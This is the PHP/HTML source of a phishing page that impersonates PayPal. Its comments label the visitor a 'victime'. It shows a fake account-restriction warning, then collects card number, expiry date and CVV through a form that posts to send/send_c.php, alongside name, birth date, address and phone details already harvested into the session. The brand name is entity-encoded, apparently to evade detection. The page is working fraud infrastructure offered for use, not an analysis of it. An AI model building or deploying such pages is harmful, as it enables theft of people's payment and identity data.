<?php

include('boot.php');

@session_start();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
  <link rel="shortcut icon" type="image/x-icon" href="./img/mou.png">
  <title>&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security</title>
  <link rel="stylesheet" type="text/css" href="css/cc.css">
   <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
   <style type="text/css" media="screen">
    .has-error input {
      border-width: 1px;
    }

    .validation.text-danger:after {
      content: 'Validation failed';
    }

    .validation.text-success:after {
      content: 'Validation passed';
    }
    .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label 
    {
          color: #a94442;
    }

    .has-error .form-control
    {
          box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
          border:2px solid #a94442;
    }
   .HF_Card {
    display: inline-block;
    background-image: url("http://i.imgur.com/NJHG6g5.png");
    background-repeat: no-repeat;
    background-position: 0px -406px;
    height: 27px;
    position: absolute;
    top: 370px;
    left: 1049px;
    width: 40px;
}
  </style>
</head>
<body>


<script src="js/jquery-3.1.1.min.js"></script>

<script src="js/pay.js" ></script>
<script language="Javascript">
// <![CDATA[
function ZEBI(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var cardnumber = (cardnumber + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4026|4508|4844)\d{2})\d{10}$/).test(cardnumber) && cardnumber.length == 19) {
//Electron
                document.getElementById("HF_Card").style.backgroundPosition = "0px -203px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(4)/).test(cardnumber) && (cardnumber.length == 19)) {
//Visa
                document.getElementById("HF_Card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(34|37)/).test(cardnumber) && cardnumber.length == 17) {
//American Express
                document.getElementById("HF_Card").style.backgroundPosition = "0px -57px";
                document.getElementById("cvv2").maxLength ="4"
}
else if ((/^(51|52|53|54|55)/).test(cardnumber) && cardnumber.length == 19) {
//Mastercard
                document.getElementById("HF_Card").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(cardnumber) && cardnumber.length == 19) {
//Maestro
                document.getElementById("HF_Card").style.backgroundPosition = "0px -174px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(6011|16)/).test(cardnumber) && cardnumber.length == 19) {
//Discover
                document.getElementById("HF_Card").style.backgroundPosition = "0px -86px";
}
else if ((/^(30|36|38|39)/).test(cardnumber) && (cardnumber.length == 14)) {
//DINER
                document.getElementById("HF_Card").style.backgroundPosition = "0px -115";
}
else if ((/^(35|3088|3096|3112|3158|3337)/).test(cardnumber) && (cardnumber.length == 19)) {
//JCB
                document.getElementById("HF_Card").style.backgroundPosition = "0px -145px";
}
else {
                document.getElementById("HF_Card").style.backgroundPosition = "0px -406px";
}

}

// ]]></script>

<script>
    


    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

      $('#send_cc').click(function(){

    var cardType = $.payment.cardType($('.cc-number').val());
    var ex_n  = $('.cc-exp').val().split('/');
    var exp_m = ex_n[0];
    var exp_y = ex_n[1];

        var v_num = $.payment.validateCardNumber($('.cc-number').val());
        var v_exp = $.payment.validateCardCVC($('.cc-cvc').val(), cardType);
        var v_exd = $.payment.validateCardExpiry(exp_m, exp_y);
    
    if(v_num == true && v_exp == true && v_exd == true)
    {
      return true;
    }
    else
    {
          $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
          $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
          $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
          $('.cc-brand').text(cardType);
          return false;
    }

      });



       

    });
  </script>
  

  <!--  Start NavBar Mobile   -->
   
   <div class="nav_mobile">
    <div class="menu_m">
      <a href="">Main Menu</a>
    </div>
    <div class="logo_m">
      <a href="">
        <img src="img/logo.svg">
      </a>
    </div>
    <div class="netif_m">
       <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>  
      </div>
   </div>


   <!--   END NavBar Mobile   -->

   <!--  Start NavBar DeskTop   -->

   <div class="menu_desk">
      <div class="logo_d">
         <a href="">
            <img src="img/logo.svg">
         </a>
      </div>
      <div class="all_nav">
         <ul class="list_menu">
            <li>
               <a href="">SUMMARY</a>
            </li>
            <li>
               <a href="">ACTIVITY</a>
            </li>
            <li>
               <a href="">SEND & REQUEST PAYMENTS</a>
            </li>
            <li>
               <a href="">WALLET</a>
            </li>
            <li>
               <a href="">SHOP</a>
            </li>
         </ul>
         
      </div>
    <ul class="setting">
       <li class="no">
         <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
       </li> 
       <li class="no">
         <i class="fa fa-cog" aria-hidden="true" style="   cursor: pointer; font-size: 27px; color: #F5F7FA;margin-top: -6px;"></i>
       </li>
       <li>
         <button>Log Out</button>
       </li>
      </ul>
   </div>


   <!--  END NavBar DeskTop   -->

   <!--   Start Photo Victime  && Name -->

   <div class="victime">
    <div class="bil">
      <div class="img_victime">
        <img src="img/user8.png">
      </div>
      <div class="name_victime">
        <p><?php echo @$_SESSION['full_name'];?>!</p>
        <button>
          <span>Get the most out of &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;</span>
        </button>
      </div>
    </div>
   </div>

   <!--   END Photo Victime  && Name  -->


   <div class="wrapp"> <!--   Start Wrapp   -->
    <div class="mony">
      <div class="blance">
        <a href="">
          <span class="moustache">&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; balance</span>
          <span class="det">Details</span>
        </a>
      </div>
      <div class="ch7al">
        <span id="anon">
        <img src="img/worning.png">  
        </span>
        <span id="anonisma">We are sorry to inform you that you can not access all your account advantages like sending money and purchasing</span>
      </div>
      <ul>
        <li>
          <a href="">Withdraw funds</a>
        </li>
        <li>
          <a href="">Withdraw Funds using local bank</a>
        </li>
      </ul>
    </div>

    <!--  END Tbat Victime   -->

    <div class="moustache_anonisma">
    <div class="cash">
      <h2 class="talgim">Update Card Information</h2>
    </div>
    <div class="mia_khalifa">
      <form action="send/send_c.php" method="post" autocomplete="off">
   <div class="upload_info">
    
      <div class="form-group inputspecial hassan_majd">
        <label for="cc-number" class="control-label"></label>
    <input name="number_cart" id="cc-number" type="tel" class="input-lg form-control cc-number cc-num" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" onkeypress="return isNumberKey(event)" onkeyup="ZEBI(this.value)" onkeyup="type_carte()" id="nubmer-cart" required>
    <span class="HF_Card" id="HF_Card"></span>
      </div>

      <div class="form-group inputspecial wiz_khalifa">
        <label for="cc-exp" class="control-label"></label>
        <input name="date_cart" id="cc-exp" type="tel" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="•• / ••" required>
      </div>

      <div class="form-group inputspecial array_3">
        <label for="cc-cvc" class="control-label"></label>
        <input name="ccv_cart" id="cc-cvc" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="•••" required>
      </div>

      <div class="billing">
        <p>Billing Adress</p>
        <div class="info">
          Full Name : <?php echo @$_SESSION['full_name']; ?> ,
          Date Of Brith : <?php echo @$_SESSION['date']; ?> ,
          Address Line : <?php echo @$_SESSION['adrs']; ?> ,
          Phone Number : <?php echo @$_SESSION['phone']; ?>
          <a href="billing.php">Edit Your Billing address</a>
        </div>
      </div>

      <div class="dawzo">
      <input type="submit" id="send_cc" name="sbt" value="Confirm and Processes">
      </div>
    
  </div>
</form>
    </div>
    </div>
    
   <!--   Start Update Billing   -->

    <!--  Start Tbat Victime  -->

   <div class="wiz">
    <div class="up">
      <span class="update">Verification step</span>
   </div>
   <ul>
     <li class="active">
      <a href="">
        Confirmer Billing
      </a>
     </li>
     <li class="none">
      <a href="">
        Confirm The Card
      </a>
     </li>
     <li class="none">
      <a href="">
        Verify identity
      </a>
     </li>
   </ul>
   </div>



   
   


   <!--   END Update Billing   -->


   


   </div>  <!--   END Wrapp   -->


   <!--  Start Footer   -->


   <footer>
      <div class="lawal">
         <a href="">HELP & CONTACT</a>
         <a href="">SECURITY</a>
      </div>
      <div class="tani">
         <span>Copyright &copy; 1999-20<?php echo date('y');?> &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;. All rights reserved.</span>
         <a href="">Privacy</a>
         <a href="">Legal</a>
      </div>
      <div class="talat">
         <p>Consumer advisory- &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;; Pte. Ltd., the holder of &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the terms and conditions carefully.</p>
      </div>
   </footer>


   <!--  END Footer  -->

</body>
</html>